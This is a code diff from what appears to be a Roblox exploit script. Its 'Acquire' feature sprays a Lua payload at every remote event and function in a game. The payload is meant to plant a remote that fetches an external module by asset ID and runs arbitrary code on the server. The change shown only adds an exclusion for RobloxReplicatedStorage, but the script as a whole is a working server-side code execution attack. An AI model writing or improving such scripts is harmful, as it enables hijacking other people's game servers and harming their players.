@@ -149,13 +149,13 @@ Acqur.MouseButton1Click:Connect(function()if not isAcquiring then
 	local RequiredName = string.char(math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90))
 	local AcquireCode = 'local a = Instance.new("RemoteEvent",game:GetService("Players"):WaitForChild("'..game:GetService('Players').LocalPlayer.Name..'"); a.Name = "'..RequiredName..'"; a.OnServerEvent:Connect(function(_,code)require(14132891321):SpawnS(code,workspace)end);' 
 	Cody.Text = "-- Acquire Feature V2\n-- Acquiring, please wait..."
-	for i,v in pairs(game:GetDescendants()) do 
+	for i,v in pairs(game:GetDescendants()) do if v.Parent ~= game:GetService("RobloxReplicatedStorage") then 
 		if v:IsA("RemoteEvent") then 
 			v:FireServer(AcquireCode) 
 		elseif v:IsA("RemoteFunction") then 
 			task.spawn(function()v:InvokeServer(AcquireCode)end) 
 		end 
-	end 
+	end end 
 	wait(10)
 	if game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) then 
 		local SelectedInstance = game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) 
